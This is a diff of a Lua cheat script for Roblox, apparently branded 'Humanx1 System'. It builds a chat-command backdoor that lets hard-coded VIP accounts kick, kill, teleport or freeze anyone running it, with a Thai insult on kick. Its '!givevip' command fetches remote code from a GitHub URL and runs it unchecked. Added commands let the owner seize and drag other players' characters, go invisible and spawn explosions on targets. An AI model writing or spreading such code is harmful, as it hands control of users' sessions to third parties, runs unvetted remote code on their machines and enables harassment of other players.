@@ -3,9 +3,8 @@
 local Player = game.Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local MyName = Player.Name
-local KickSoundID = "rbxassetid://137337370812885" -- ID เพลงที่คุณให้มา
+local KickSoundID = "rbxassetid://137337370812885"
 
--- รายชื่อ Admin/VIP หลัก
 _G.VIP_LIST = _G.VIP_LIST or {
     ["ffsww_1007"] = true,
     ["A_ASPD"] = true,
@@ -15,7 +14,6 @@ _G.VIP_LIST = _G.VIP_LIST or {
     ["Winwie001"] = true
 }
 
--- ฟังก์ชันแจ้งเตือน (Notification)
 local function ShowNotify(text)
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Humanx1 System",
@@ -24,15 +22,12 @@ local function ShowNotify(text)
     })
 end
 
--- ฟังก์ชันดีดออก (พร้อมเล่นเสียงด่า)
 local function CustomKick()
-    -- เล่นเสียง
     local Sound = Instance.new("Sound", game.Workspace)
     Sound.SoundId = KickSoundID
-    Sound.Volume = 5 -- ปรับระดับเสียง (สูงสุดประมาณ 10)
+    Sound.Volume = 5
     Sound:Play()
 
-    -- แสดง UI เต็มจอ
     local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
     ScreenGui.IgnoreGuiInset = true
     local TextLabel = Instance.new("TextLabel", ScreenGui)
@@ -45,11 +40,10 @@ local function CustomKick()
     TextLabel.TextScaled = true
     TextLabel.ZIndex = 999999
 
-    task.wait(3.5) -- เพิ่มเวลาหน่อยเพื่อให้เสียงเล่นไปสักพักก่อนหลุด
+    task.wait(3.5)
     Player:Kick("\n\n[ Humanx1 System ]\nโดนกูเตะไงไอ้ควาย\n(error555)\n\n")
 end
 
--- ฟังก์ชันค้นหาผู้เล่น
 local function findByPartialName(name)
     name = name:lower()
     for _, p in pairs(game.Players:GetPlayers()) do
@@ -66,12 +60,61 @@ local function ListenChat(speaker, msg)
     if _G.VIP_LIST[speaker.Name] then
         local target = args[2] and findByPartialName(args[2])
 
-        -- === คำสั่งเสริม ===
+        -- === [ ระบบควบคุมแบบสมบูรณ์ ] ===
         if speaker.Name == MyName then
-            if command == "!view" and target then
-                Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
-            elseif command == "!unview" then
-                Camera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
+            
+            -- สั่งสิงร่าง (เป้าหมายจะขยับไม่ได้เลย นอกจากพิมพ์)
+            if command == "!control" and target then
+                _G.ControlLoop = true
+                _G.CurrentTarget = target
+                Camera.CameraSubject = target.Character.Humanoid
+                ShowNotify("เข้าควบคุม: "..target.Name.." (เป้าหมายถูกล็อคการเคลื่อนที่)")
+                
+                task.spawn(function()
+                    while _G.ControlLoop do
+                        if _G.CurrentTarget and _G.CurrentTarget.Character and Player.Character then
+                            local tChar = _G.CurrentTarget.Character
+                            local pChar = Player.Character
+                            
+                            -- ล็อคเป้าหมายให้ขยับเองไม่ได้ (Anchored บางส่วนหรือล็อคตำแหน่ง)
+                            if tChar:FindFirstChild("HumanoidRootPart") then
+                                -- ดึงตัวเขามาไว้ที่ตัวเราตลอดเวลา (เราเดินไปไหน เขาจะวาร์ปตามมาติดๆ)
+                                tChar.HumanoidRootPart.CFrame = pChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, -1)
+                                -- ปิดการควบคุมการเดินของเขา
+                                tChar.Humanoid.PlatformStand = true 
+                            end
+                        end
+                        task.wait()
+                    end
+                end)
+
+            -- ยกเลิกการควบคุม
+            elseif command == "!uncontrol" then
+                _G.ControlLoop = false
+                if _G.CurrentTarget and _G.CurrentTarget.Character then
+                    _G.CurrentTarget.Character.Humanoid.PlatformStand = false
+                end
+                _G.CurrentTarget = nil
+                Camera.CameraSubject = Player.Character.Humanoid
+                ShowNotify("ปลดปล่อยเป้าหมายแล้ว")
+
+            -- คำสั่งอื่นๆ (ล่องหน / ระเบิด)
+            elseif command == "!invisible" then
+                _G.Invis = not _G.Invis
+                Player.Character.HumanoidRootPart.CFrame *= CFrame.new(0, (_G.Invis and -20 or 20), 0)
+                ShowNotify("ล่องหน: "..(_G.Invis and "เปิด" or "ปิด"))
+
+            elseif command == "!explode" and target then
+                local exp = Instance.new("Explosion", game.Workspace)
+                exp.Position = target.Character.HumanoidRootPart.Position
+                ShowNotify("ระเบิดเป้าหมายแล้ว")
+            end
+        end
+
+        -- === [ หมวดคำสั่งเดิม ] ===
+        if speaker.Name == MyName then
+            if command == "!view" and target then Camera.CameraSubject = target.Character.Humanoid
+            elseif command == "!unview" then Camera.CameraSubject = Player.Character.Humanoid
             elseif command == "!checkvip" then
                 local list = "VIPs: "
                 for name, _ in pairs(_G.VIP_LIST) do if game.Players:FindFirstChild(name) then list = list .. name .. ", " end end
@@ -79,52 +122,17 @@ local function ListenChat(speaker, msg)
             end
         end
 
-        -- 1. หมวดเตะ
-        if command == "!kick" and target == Player then
-            CustomKick()
-        elseif command == "!kickall" then
-            CustomKick()
-
-        -- 2. หมวดสังหาร
-        elseif command == "!kill" and target == Player then
-            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
-                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
-            end
-        elseif command == "!killall" then
-            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
-                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
-            end
-
-        -- 3. หมวด TP
-        elseif command == "!tp" and target == Player then
-            if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
-                if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
-                    Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
-                end
-            end
-
-        -- 4. หมวดควบคุม
-        elseif command == "!freeze" and target == Player then
-            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
-                Player.Character.HumanoidRootPart.Anchored = true
-            end
-        elseif command == "!unfreeze" and target == Player then
-            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
-                Player.Character.HumanoidRootPart.Anchored = false
-            end
-        elseif command == "!jump" and target == Player then
-            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
-                Player.Character:FindFirstChildOfClass("Humanoid").Jump = true
-            end
-
-        -- 5. มอบ VIP
+        -- หมวดจัดการผู้รัน (Kick, Kill, TP, Freeze)
+        if command == "!kick" and target == Player then CustomKick()
+        elseif command == "!kickall" then CustomKick()
+        elseif command == "!kill" and target == Player then if Player.Character then Player.Character.Humanoid.Health = 0 end
+        elseif command == "!tp" and target == Player then if speaker.Character then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame end
+        elseif command == "!freeze" and target == Player then Player.Character.HumanoidRootPart.Anchored = true
+        elseif command == "!unfreeze" and target == Player then Player.Character.HumanoidRootPart.Anchored = false
+        elseif command == "!jump" and target == Player then Player.Character.Humanoid.Jump = true
         elseif command == "!givevip" and target == Player then
-            if _G.VIP_LIST[Player.Name] then
-                if speaker.Name == MyName then ShowNotify("คนนี้ have vip อยู่เเล้ว") end
-            else
-                _G.VIP_LIST[Player.Name] = true
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-            end
+            _G.VIP_LIST[Player.Name] = true
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
         end
     end
 end
